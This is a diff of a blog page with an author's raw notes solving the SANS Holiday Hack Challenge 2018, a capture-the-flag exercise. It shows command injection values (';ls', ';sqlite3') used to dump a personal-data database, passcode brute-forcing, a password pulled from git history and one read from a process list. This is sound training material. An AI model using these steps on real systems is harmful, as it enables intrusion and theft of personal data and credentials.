@@ -14,9 +14,9 @@
 <meta name=generator content="Hugo 0.88.1">
 <meta name=twitter:card content="summary">
 <meta name=twitter:title content="SANS Holiday Hack Challenge 2018 - Raw Notes">
-<meta name=twitter:description content="OSINT Happy Trails
-vim q!
-The Name Game Using 2, it's vulnerable to command injection.
+<meta name=twitter:description content="OSINT  Happy Trails
+vim  q!
+The Name Game  Using 2, it's vulnerable to command injection.
 Asks for a server address and does a ping but we can inject commands after ;.
 Result of ls
 Validating data store for employee onboard information. Enter address of server: ;ls Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface] [-m mark] [-M pmtudisc_option] [-l preload] [-p pattern] [-Q tos] [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option] [-w deadline] [-W timeout] [hop1 .">
@@ -53,7 +53,7 @@ Validating data store for employee onboard information. Enter address of server:
 <article class=hentry role=article>
 <header>
 <p class=meta>
-50 minute read
+51 minute read
 - <a class=label href=http://parsiya.io/categories/research/>Research </a>
 </p>
 <h1 class=entry-title>
@@ -62,12 +62,15 @@ SANS Holiday Hack Challenge 2018 - Raw Notes
 <a href=https://github.com/parsiya/Parsia-Clone/tree/main/research/sans-holiday-2018/index.md target=_blank>Github Link</a>
 </header>
 <div class=entry-content>
-<h1 id=osint>OSINT</h1>
-<p>Happy Trails</p>
-<h1 id=vim>vim</h1>
-<p><code>q!</code></p>
-<h1 id=the-name-game>The Name Game</h1>
-<p>Using 2, it's vulnerable to command injection.</p>
+<h1 id=osint>OSINT
+<a class=header-link href=#osint><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Happy Trails</p>
+<h1 id=vim>vim
+<a class=header-link href=#vim><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p><code>q!</code></p>
+<h1 id=the-name-game>The Name Game
+<a class=header-link href=#the-name-game><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>Using 2, it's vulnerable to command injection.</p>
 <p>Asks for a server address and does a ping but we can inject commands after <code>;</code>.</p>
 <p>Result of ls</p>
 <pre tabindex=0><code>Validating data store for employee onboard information.
@@ -77,8 +80,8 @@ Usage: ping [-aAbBdDfhLnOqrRUvV] [-c count] [-i interval] [-I interface]
             [-s packetsize] [-S sndbuf] [-t ttl] [-T timestamp_option]
             [-w deadline] [-W timeout] [hop1 ...] destination
 menu.ps1  onboard.db  runtoanswer
-onboard.db: SQLite 3.x database</code></pre>
-<p><code>menu.ps1</code></p>
+onboard.db: SQLite 3.x database
+</code></pre><p><code>menu.ps1</code></p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-powershell data-lang=powershell><span style=color:#268bd2>$global:firstrun</span> = <span style=color:#268bd2>$TRUE</span>
 
 <span style=color:#719e07>function</span> <span style=color:#b58900>Show-Menu</span>
@@ -192,8 +195,8 @@ onboard.db: SQLite 3.x database</code></pre>
     <span style=color:#719e07>until</span> (<span style=color:#268bd2>$input</span> <span style=color:#719e07>-eq</span> <span style=color:#2aa198>&#39;q&#39;</span>)
 } <span style=color:#719e07>finally</span> {
 }
-onboard.db: SQLite 3.x database</code></pre></div>
-<p>Just inject <code>;sqlite3</code> to be dropped into sqlite prompt.</p>
+onboard.db: SQLite 3.x database
+</code></pre></div><p>Just inject <code>;sqlite3</code> to be dropped into sqlite prompt.</p>
 <p>Then do <code>.open onboard.db</code> and finally <code>.dump</code> to get everything.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-sql data-lang=sql><span style=color:#719e07>INSERT</span> <span style=color:#719e07>INTO</span> <span style=color:#2aa198>&#34;onboard&#34;</span> <span style=color:#719e07>VALUES</span>(<span style=color:#2aa198>10</span>,<span style=color:#2aa198>&#39;Karen&#39;</span>,<span style=color:#2aa198>&#39;Duck&#39;</span>,<span style=color:#2aa198>&#39;52 Annfield Rd&#39;</span>,<span style=color:#719e07>NULL</span>,<span style=color:#2aa198>&#39;BEAL&#39;</span>,<span style=color:#2aa198>&#39;DN14 7AU&#39;</span>,<span style=color:#2aa198>&#39;07
 </span><span style=color:#2aa198>7 8656 6609&#39;</span>,<span style=color:#2aa198>&#39;karensduck@einrot.com&#39;</span>);
@@ -379,20 +382,24 @@ onboard.db: SQLite 3.x database</code></pre></div>
 <span style=color:#719e07>INSERT</span> <span style=color:#719e07>INTO</span> <span style=color:#2aa198>&#34;onboard&#34;</span> <span style=color:#719e07>VALUES</span>(<span style=color:#2aa198>169</span>,<span style=color:#2aa198>&#39;Stephanie&#39;</span>,<span style=color:#2aa198>&#39;Jaynes&#39;</span>,<span style=color:#2aa198>&#39;1854 Tycos Dr&#39;</span>,<span style=color:#719e07>NULL</span>,<span style=color:#2aa198>&#39;Toronto&#39;</span>,<span style=color:#2aa198>&#39;M5T 
 </span><span style=color:#2aa198>1T4&#39;</span>,<span style=color:#2aa198>&#39;416-605-0198&#39;</span>,<span style=color:#2aa198>&#39;stephaniejjaynes@rhyta.com&#39;</span>);
 <span style=color:#719e07>COMMIT</span>;
-sqlite<span style=color:#719e07>&gt;</span> </code></pre></div>
-<h2 id=objective-2>Objective 2</h2>
-<p>Go to the CFP website which is <a href=https://cfp.kringlecastle.com/cfp/cfp.html rel=nofollow target=_blank>https://cfp.kringlecastle.com/cfp/cfp.html</a>.</p>
-<p>Navigate to <a href=https://cfp.kringlecastle.com/cfp/ rel=nofollow target=_blank>https://cfp.kringlecastle.com/cfp/</a> to see directory listing.</p>
+sqlite<span style=color:#719e07>&gt;</span> 
+</code></pre></div>
+<h2 id=objective-2>Objective 2
+<a class=header-link href=#objective-2><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Go to the CFP website which is <a href=https://cfp.kringlecastle.com/cfp/cfp.html target=_blank rel="noreferrer noopener">https://cfp.kringlecastle.com/cfp/cfp.html</a>.</p>
+<p>Navigate to <a href=https://cfp.kringlecastle.com/cfp/ target=_blank rel="noreferrer noopener">https://cfp.kringlecastle.com/cfp/</a> to see directory listing.</p>
 <pre tabindex=0><code>../
 cfp.html                                           08-Dec-2018 13:19                3391
-rejected-talks.csv                                 08-Dec-2018 13:19               30677</code></pre>
-<p>And the answer is <code>John McClane</code></p>
+rejected-talks.csv                                 08-Dec-2018 13:19               30677
+</code></pre><p>And the answer is <code>John McClane</code></p>
 <pre tabindex=0><code>talkCandidateId,request,payload,status,error,timeout,firstName,lastName,title,talkName,approveVotes,rejectVotes
 qmt1,0,8040422,200,FALSE,FALSE,Banky,Orford,Marketing Coordinator,Kernel Introspection Spearphishing: Massively Multithreaded,4,8
 qmt2,1,8040423,200,FALSE,FALSE,Sarah,Thibodeaux,Event Planner,Crypto or Containers: Abused for Fun and Proft,4,8
-qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11</code></pre>
-<h2 id=lethal-forensicelfication>Lethal ForensicELFication</h2>
-<p>Vim leaves files behind.</p>
+qmt3,2,8040424,200,FALSE,FALSE,John,McClane,Director of Security,Data Loss for Rainbow Teams: A Path in the Darkness,1,11
+</code></pre>
+<h2 id=lethal-forensicelfication>Lethal ForensicELFication
+<a class=header-link href=#lethal-forensicelfication><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Vim leaves files behind.</p>
 <div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-s data-lang=s>elf<span style=color:#719e07>@</span>d45108e2a925<span style=color:#719e07>:~$</span> ls <span style=color:#719e07>-</span>alt
 total <span style=color:#2aa198>5460</span>
 drwxr<span style=color:#719e07>-</span>xr<span style=color:#719e07>-</span>x <span style=color:#2aa198>1</span> elf  elf     <span style=color:#2aa198>4096</span> Dec <span style=color:#2aa198>14</span> <span style=color:#2aa198>16</span><span style=color:#719e07>:</span><span style=color:#2aa198>28</span> .
@@ -403,14 +410,14 @@ drwxr<span style=color:#719e07>-</span>xr<span style=color:#719e07>-</span>x <sp
 <span style=color:#719e07>-</span>rw<span style=color:#719e07>-</span>r<span style=color:#719e07>--</span>r<span style=color:#719e07>--</span> <span style=color:#2aa198>1</span> elf  elf     <span style=color:#2aa198>5063</span> Dec <span style=color:#2aa198>14</span> <span style=color:#2aa198>16</span><span style=color:#719e07>:</span><span style=color:#2aa198>13</span> .viminfo
 <span style=color:#719e07>-</span>rwxr<span style=color:#719e07>-</span>xr<span style=color:#719e07>-</span>x <span style=color:#2aa198>1</span> elf  elf  <span style=color:#2aa198>5551072</span> Dec <span style=color:#2aa198>14</span> <span style=color:#2aa198>16</span><span style=color:#719e07>:</span><span style=color:#2aa198>13</span> runtoanswer
 <span style=color:#719e07>-</span>rw<span style=color:#719e07>-</span>r<span style=color:#719e07>--</span>r<span style=color:#719e07>--</span> <span style=color:#2aa198>1</span> elf  elf      <span style=color:#2aa198>220</span> May <span style=color:#2aa198>15</span>  <span style=color:#2aa198>2017</span> .bash_logout
-<span style=color:#719e07>-</span>rw<span style=color:#719e07>-</span>r<span style=color:#719e07>--</span>r<span style=color:#719e07>--</span> <span style=color:#2aa198>1</span> elf  elf      <span style=color:#2aa198>675</span> May <span style=color:#2aa198>15</span>  <span style=color:#2aa198>2017</span> .profile</code></pre></div>
-<p>cat .viminfo</p>
+<span style=color:#719e07>-</span>rw<span style=color:#719e07>-</span>r<span style=color:#719e07>--</span>r<span style=color:#719e07>--</span> <span style=color:#2aa198>1</span> elf  elf      <span style=color:#2aa198>675</span> May <span style=color:#2aa198>15</span>  <span style=color:#2aa198>2017</span> .profile
+</code></pre></div><p>cat .viminfo</p>
 <pre tabindex=0><code>elf@d45108e2a925:~$ cat .viminfo 
 # This viminfo file was generated by Vim 8.0.
-# You may edit it if you&#39;re careful!
+# You may edit it if you're careful!
 # Viminfo version
 |1,4
-# Value of &#39;encoding&#39; when this file was written
+# Value of 'encoding' when this file was written
 *encoding=utf-8
 # hlsearch on (H) or off (h):
 ~h
@@ -420,38 +427,38 @@ drwxr<span style=color:#719e07>-</span>xr<span style=color:#719e07>-</span>x <sp
 $NEVERMORE
 # Command Line History (newest to oldest):
 :wq
-|2,0,1536607231,,&#34;wq&#34;
+|2,0,1536607231,,&quot;wq&quot;
 :%s/Elinore/NEVERMORE/g
-|2,0,1536607217,,&#34;%s/Elinore/NEVERMORE/g&#34;
+|2,0,1536607217,,&quot;%s/Elinore/NEVERMORE/g&quot;
 :r .secrets/her/poem.txt
-|2,0,1536607201,,&#34;r .secrets/her/poem.txt&#34;
+|2,0,1536607201,,&quot;r .secrets/her/poem.txt&quot;
 :q
-|2,0,1536606844,,&#34;q&#34;
+|2,0,1536606844,,&quot;q&quot;
 :w
-|2,0,1536606841,,&#34;w&#34;
+|2,0,1536606841,,&quot;w&quot;
 :s/God/fates/gc
-|2,0,1536606833,,&#34;s/God/fates/gc&#34;
+|2,0,1536606833,,&quot;s/God/fates/gc&quot;
 :%s/studied/looking/g
-|2,0,1536602549,,&#34;%s/studied/looking/g&#34;
-|2,0,1536602549,,&#34;%s/studied/looking/g&#34;
+|2,0,1536602549,,&quot;%s/studied/looking/g&quot;
+|2,0,1536602549,,&quot;%s/studied/looking/g&quot;
 :%s/sound/tenor/g
-|2,0,1536600579,,&#34;%s/sound/tenor/g&#34;
+|2,0,1536600579,,&quot;%s/sound/tenor/g&quot;
 :r .secrets/her/poem.txt
-|2,0,1536600314,,&#34;r .secrets/her/poem.txt&#34;
+|2,0,1536600314,,&quot;r .secrets/her/poem.txt&quot;
 
 # Search String History (newest to oldest):
 ? Elinore
-|2,1,1536607217,,&#34;Elinore&#34;
+|2,1,1536607217,,&quot;Elinore&quot;
 ? God
-|2,1,1536606833,,&#34;God&#34;
+|2,1,1536606833,,&quot;God&quot;
 ? rousted
-|2,1,1536605996,,&#34;rousted&#34;
+|2,1,1536605996,,&quot;rousted&quot;
 ? While
-|2,1,1536604909,,&#34;While&#34;
+|2,1,1536604909,,&quot;While&quot;
 ? studied
-|2,1,1536602549,,&#34;studied&#34;
+|2,1,1536602549,,&quot;studied&quot;
 ? sound
-|2,1,1536600579,,&#34;sound&#34;
+|2,1,1536600579,,&quot;sound&quot;
 
 # Expression History (newest to oldest):
 
@@ -460,42 +467,42 @@ $NEVERMORE
 # Debug Line History (newest to oldest):
 
 # Registers:
-&#34;1      LINE    0
+&quot;1      LINE    0
 
-|3,0,1,1,1,0,1536605034,&#34;&#34;
-&#34;&#34;-     CHAR    0
+|3,0,1,1,1,0,1536605034,&quot;&quot;
+&quot;&quot;-     CHAR    0
         .
-|3,1,36,0,1,0,1536606803,&#34;.&#34;
+|3,1,36,0,1,0,1536606803,&quot;.&quot;
 
 # File marks:
-&#39;0  34  2  ~/.secrets/her/poem.txt
-|4,48,34,2,1536607231,&#34;~/.secrets/her/poem.txt&#34;
+'0  34  2  ~/.secrets/her/poem.txt
+|4,48,34,2,1536607231,&quot;~/.secrets/her/poem.txt&quot;
 ...
 
 # Jumplist (newest first):
--&#39;  34  2  ~/.secrets/her/poem.txt
-|4,39,34,2,1536607231,&#34;~/.secrets/her/poem.txt&#34;
+-'  34  2  ~/.secrets/her/poem.txt
+|4,39,34,2,1536607231,&quot;~/.secrets/her/poem.txt&quot;
 ...
 
 # History of marks within files (newest to oldest):
 
 &gt; ~/.secrets/her/poem.txt
 ...
-elf@d45108e2a925:~$ </code></pre>
-<p>Is it <code>Elinore</code>? Look at the poem file at <code>/.secrets/her/poem.txt</code></p>
+elf@d45108e2a925:~$ 
+</code></pre><p>Is it <code>Elinore</code>? Look at the poem file at <code>/.secrets/her/poem.txt</code></p>
 <pre tabindex=0><code>elf@d45108e2a925:~/.secrets/her$ cat poem.txt 
 Once upon a sleigh so weary, Morcel scrubbed the grime so dreary,
 Shining many a beautiful sleighbell bearing cheer and sound so pure--
   There he cleaned them, nearly napping, suddenly there came a tapping,
 As of someone gently rapping, rapping at the sleigh house door.
-&#34;&#39;Tis some caroler,&#34; he muttered, &#34;tapping at my sleigh house door--
-  Only this and nothing more.&#34;
-Then, continued with more vigor, came the sound he didn&#39;t figure,
-Could belong to one so lovely, walking &#39;bout the North Pole grounds.
-  But the truth is, she WAS knocking, &#39;cause with him she would be talking,
+&quot;'Tis some caroler,&quot; he muttered, &quot;tapping at my sleigh house door--
+  Only this and nothing more.&quot;
+Then, continued with more vigor, came the sound he didn't figure,
+Could belong to one so lovely, walking 'bout the North Pole grounds.
+  But the truth is, she WAS knocking, 'cause with him she would be talking,
 Off with fingers interlocking, strolling out with love newfound?
 Gazing into eyes so deeply, caring not who sees their rounds.
-  Oh, &#39;twould make his heart resound!
+  Oh, 'twould make his heart resound!
 Hurried, he, to greet the maiden, dropping rag and brush - unlaiden.
 Floating over, more than walking, moving toward the sound still knocking,
   Pausing at the elf-length mirror, checked himself to study clearer,
@@ -506,65 +513,70 @@ Greeting her with smile dashing, pearly-white incisors flashing,
 Telling jokes to keep her laughing, soaring high upon the tidings,
   Of good fortune fates had borne him.  Offered her his dexter forelimb,
 Never was his future less dim!  Should he now consider gliding--
-No - they shouldn&#39;t but consider taking flight in sleigh and riding
+No - they shouldn't but consider taking flight in sleigh and riding
   Up above the Pole abiding?
 Smile, she did, when he suggested that their future surely rested,
-Up in flight above their cohort flying high like ne&#39;er before!
+Up in flight above their cohort flying high like ne'er before!
   So he harnessed two young reindeer, bold and fresh and bearing no fear.
 In they jumped and seated so near, off they flew - broke through the door!
 Up and up climbed team and humor, Morcel being so adored,
   By his lovely NEVERMORE!
--Morcel Nougat</code></pre>
-<p>Yes it is <code>Elinore</code></p>
+-Morcel Nougat
+</code></pre><p>Yes it is <code>Elinore</code></p>
 <pre tabindex=0><code>elf@ae4da3afe93d:~$ runtoanswer Elinor
 Loading, please wait......
 Who was the poem written about? Elinor
-Sorry, I don&#39;t think that&#39;s what the forensic data shows.
+Sorry, I don't think that's what the forensic data shows.
 elf@ae4da3afe93d:~$ runtoanswer Elinore
 Loading, please wait......
 Who was the poem written about? Elinore
-WWNXXK00OOkkxddoolllcc::;;;,,,&#39;&#39;&#39;.............                                 
-WWNXXK00OOkkxddoolllcc::;;;,,,&#39;&#39;&#39;.............                                 
-WWNXXK00OOkkxddoolllcc::;;;,,,&#39;&#39;&#39;.............                                 
-WWNXXKK00OOOxddddollcccll:;,;:;,&#39;...,,.....&#39;&#39;,,&#39;&#39;.    .......    .&#39;&#39;&#39;&#39;&#39;&#39;       
-WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;&#39;...,:;.  ,,....,,.  ::&#39;....       
-WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::&#39;...        
-WWNXXXKK0OOkxdxxxollcccoo:;,cc,&#39;;:;&#39;:;..,::...   ,:;  ,,,&#39;,,&#39;    ::,&#39;&#39;&#39;.       
-WWNXXXK0OOkkxdxxxollcccoo:;,cc,&#39;&#39;;:;:;..&#39;::&#39;..  .;:.  ,,.  &#39;,&#39;   ::.           
-WWNXXXKK00OOkdxxxddooccoo:;,cc,&#39;&#39;.,::;....;:;,,;:,.   ,,.   &#39;,&#39;  ::;;;;;       
-WWNXXKK0OOkkxdddoollcc:::;;,,,&#39;&#39;&#39;...............                               
-WWNXXK00OOkkxddoolllcc::;;;,,,&#39;&#39;&#39;.............                                 
-WWNXXK00OOkkxddoolllcc::;;;,,,&#39;&#39;&#39;.............                                 
+WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
+WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
+WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
+WWNXXKK00OOOxddddollcccll:;,;:;,'...,,.....'',,''.    .......    .''''''       
+WWNXXXKK0OOkxdxxxollcccoo:;,ccc:;...:;...,:;'...,:;.  ,,....,,.  ::'....       
+WWNXXXKK0OOkxdxxxollcccoo:;,cc;::;..:;..,::...   ;:,  ,,.  .,,.  ::'...        
+WWNXXXKK0OOkxdxxxollcccoo:;,cc,';:;':;..,::...   ,:;  ,,,',,'    ::,'''.       
+WWNXXXK0OOkkxdxxxollcccoo:;,cc,'';:;:;..'::'..  .;:.  ,,.  ','   ::.           
+WWNXXXKK00OOkdxxxddooccoo:;,cc,''.,::;....;:;,,;:,.   ,,.   ','  ::;;;;;       
+WWNXXKK0OOkkxdddoollcc:::;;,,,'''...............                               
+WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
+WWNXXK00OOkkxddoolllcc::;;;,,,'''.............                                 
 Thank you for solving this mystery, Slick.
 Reading the .viminfo sure did the trick.
 Leave it to me; I will handle the rest.
 Thank you for giving this challenge your best.
 -Tangle Coalbox
 -ER Investigator
-Congratulations!</code></pre>
-<h2 id=door-passcode>Door Passcode</h2>
-<p>Proxy the requests and see the symbols represent <code>0123</code>. Request is</p>
-<pre tabindex=0><code>https://doorpasscode.kringlecastle.com/checkpass.php?i=0123&amp;resourceId=undefined</code></pre>
-<p>Bad response:</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>false</span>,<span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Incorrect guess.&#34;</span>}</code></pre></div>
-<p>Do Burp Intruder to get the good response and passcode is <code>0120</code>.</p>
-<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;undefined&#34;</span>,<span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703&#34;</span>,<span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Correct guess!&#34;</span>}</code></pre></div>
-<p>Not sure what that hash it, it appears to be the hash of <code>resourceId</code>? So I guess we can trick the client into thinking it has opened the door? Or is it just a client side cehck?</p>
-<h1 id=3-de-bruijn-sequences>3. de Bruijn Sequences</h1>
-<p>After going into the room we see Morcel saying <code>Welcome unprepared speaker!</code></p>
+Congratulations!
+</code></pre>
+<h2 id=door-passcode>Door Passcode
+<a class=header-link href=#door-passcode><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Proxy the requests and see the symbols represent <code>0123</code>. Request is</p>
+<pre tabindex=0><code>https://doorpasscode.kringlecastle.com/checkpass.php?i=0123&amp;resourceId=undefined
+</code></pre><p>Bad response:</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>false</span>,<span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Incorrect guess.&#34;</span>}
+</code></pre></div><p>Do Burp Intruder to get the good response and passcode is <code>0120</code>.</p>
+<div class=highlight><pre tabindex=0 style=color:#93a1a1;background-color:#002b36;-moz-tab-size:4;-o-tab-size:4;tab-size:4><code class=language-json data-lang=json>{<span style=color:#268bd2>&#34;success&#34;</span>:<span style=color:#cb4b16>true</span>,<span style=color:#268bd2>&#34;resourceId&#34;</span>:<span style=color:#2aa198>&#34;undefined&#34;</span>,<span style=color:#268bd2>&#34;hash&#34;</span>:<span style=color:#2aa198>&#34;0273f6448d56b3aba69af76f99bdc741268244b7a187c18f855c6302ec93b703&#34;</span>,<span style=color:#268bd2>&#34;message&#34;</span>:<span style=color:#2aa198>&#34;Correct guess!&#34;</span>}
+</code></pre></div><p>Not sure what that hash it, it appears to be the hash of <code>resourceId</code>? So I guess we can trick the client into thinking it has opened the door? Or is it just a client side cehck?</p>
+<h1 id=3-de-bruijn-sequences>3. de Bruijn Sequences
+<a class=header-link href=#3-de-bruijn-sequences><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>After going into the room we see Morcel saying <code>Welcome unprepared speaker!</code></p>
 <hr>
-<h1 id=4-data-repo-analysis>4. Data Repo Analysis</h1>
-<p>git repo is at <a href=https://git.kringlecastle.com/Upatree/santas_castle_automation rel=nofollow target=_blank>https://git.kringlecastle.com/Upatree/santas_castle_automation</a>.</p>
+<h1 id=4-data-repo-analysis>4. Data Repo Analysis
+<a class=header-link href=#4-data-repo-analysis><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h1><p>git repo is at <a href=https://git.kringlecastle.com/Upatree/santas_castle_automation target=_blank rel="noreferrer noopener">https://git.kringlecastle.com/Upatree/santas_castle_automation</a>.</p>
 <p>In the github repo there's a commit "removing accidental commit"</p>
 <p>A file was removed with info</p>
 <pre tabindex=0><code>Hopefully this is the last time we have to change our password again until next Christmas. 
-Password = &#39;Yippee-ki-yay&#39;
-Change ID = &#39;9ed54617547cfca783e0f81f8dc5c927e3d1e3&#39;</code></pre>
-<p>This can be used to open the file <code>santas_castle_automation/schematics/ventilation_diagram.zip</code>.</p>
+Password = 'Yippee-ki-yay'
+Change ID = '9ed54617547cfca783e0f81f8dc5c927e3d1e3'
+</code></pre><p>This can be used to open the file <code>santas_castle_automation/schematics/ventilation_diagram.zip</code>.</p>
 <p><strong>This has plans for the Google ventilation thing near the Google booth in the lobby.</strong></p>
 <p>It's for 1st and 2nd floor, there are more floors so I guess we can find the maps later.</p>
-<h2 id=stall-mucking-report>Stall Mucking Report</h2>
-<p>Complete this challenge by uploading the elf's report.txt
+<h2 id=stall-mucking-report>Stall Mucking Report
+<a class=header-link href=#stall-mucking-report><svg class="fill-current o-60 hover-accent-color-light" height="22" viewBox="0 0 24 24" width="22" xmlns="http://www.w3.org/2000/svg"><path d="M0 0h24v24H0z" fill="none"/><path d="M3.9 12c0-1.71 1.39-3.1 3.1-3.1h4V7H7c-2.76.0-5 2.24-5 5s2.24 5 5 5h4v-1.9H7c-1.71.0-3.1-1.39-3.1-3.1zM8 13h8v-2H8v2zm9-6h-4v1.9h4c1.71.0 3.1 1.39 3.1 3.1s-1.39 3.1-3.1 3.1h-4V17h4c2.76.0 5-2.24 5-5s-2.24-5-5-5z"/></svg></a>
+</h2><p>Complete this challenge by uploading the elf's report.txt
 file to the samba share at //localhost/report-upload/</p>
 <p>Use <code>ww</code> to disable truncating.</p>
 <pre tabindex=0><code>elf@145b364fd698:~$ ps auxww
@@ -589,47 +601,49 @@ root        24  0.0  0.0 316664 15296 ?        Ss   19:38   0:00 /usr/sbin/smbd
 root        25  0.0  0.0 308372  5684 ?        S    19:38   0:00 /usr/sbin/smbd
 root        26  0.0  0.0 308364  4544 ?        S    19:38   0:00 /usr/sbin/smbd
 root        28  0.0  0.0 316664  5908 ?        S    19:38   0:00 /usr/sbin/smbd
-elf         30  0.0  0.0  36636  2760 pts/0    R+   19:39   0:00 ps auxww</code></pre>
-<p>Command is:</p>
+elf         30  0.0  0.0  36636  2760 pts/0    R+   19:39   0:00 ps auxww
+</code></pre><p>Command is:</p>
 <p><code>smbclient //localhost/report-upload/ directreindeerflatterystable -U report-upload -c "put report.txt"</code></p>
 <pre tabindex=0><code>elf@e248923eadbe:~$ 
-WARNING: The &#34;syslog&#34; option is deprecated
